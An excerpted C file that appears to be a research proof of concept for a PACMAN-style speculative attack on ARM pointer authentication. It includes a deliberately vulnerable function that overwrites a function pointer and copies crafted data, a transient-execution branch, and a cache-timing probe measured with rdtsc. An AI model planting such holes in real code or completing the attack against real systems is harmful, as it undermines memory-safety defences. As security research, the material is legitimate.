...
// aarch64-linux-gnu-objdump -d --disassemble=vulnerable_func pacman/pacman_nonop_noprint > pacman/pacman_nonop_noprint.vulnerable_func.S
...
static void do_pressure_c(void) {
    volatile uint64_t x[64];
    for (int i=0;i<64;i++) x[i]=i;
    asm volatile("" ::: "memory");
}

static inline void code_padding(void) {
    asm volatile(
        ".rept 2048\n"   // 숫자는 512~8192 사이로 sweep 추천
        "nop\n"
        ".endr\n"
        ::: "memory"
    );
...
void reg_pressure_only(int iters) {
    volatile uint64_t a0=1,a1=2,a2=3,a3=4,a4=5,a5=6,a6=7,a7=8;
    volatile uint64_t b0=9,b1=10,b2=11,b3=12,b4=13,b5=14,b6=15,b7=16;
    ...
    asm volatile("" ::: "memory"); // 최적화 방지
}


__attribute__((noinline,aligned(0x4000)))
void vulnerable_func(void* probe, long pageSize, char * str, int transient,int spec_window_orrs){
    ...
    *(void**)(safe_str + fp_offset) = new_obj->fp;
    ...
    if(transient){
        ...
        memcpy((void*)new_obj->buf, vuln_str, sizeof(object)); // AUT FAIL (wrong PAC) 
...
int main(int argc, char **argv) {
    ...
    // additional cache flush with dummy load
    ...
    t1 = rdtsc();
    tmp ^= *(volatile int*)(probe + pageSize * TRANSIENT_ACCESS_PAGE * 2); 
    t2 = rdtsc();
